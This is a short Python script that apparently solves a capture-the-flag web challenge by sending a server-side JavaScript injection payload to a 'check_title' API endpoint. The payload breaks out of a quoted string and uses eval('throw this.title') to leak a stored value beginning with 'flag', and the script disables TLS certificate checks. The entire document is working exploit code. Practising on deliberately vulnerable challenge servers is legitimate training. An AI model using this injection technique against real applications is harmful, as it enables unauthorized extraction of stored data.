import requests
import urllib3
from urllib.parse import quote_plus
urllib3.disable_warnings()

flag="flag"
u="http://three.jh2i.com:50009/api/check_title?title="
payload="'; return this.title.startsWith('%s') && eval('throw this.title') || '" % flag
url=u + quote_plus(payload)
r = requests.get(url, verify = False, allow_redirects = False)
print(r.text)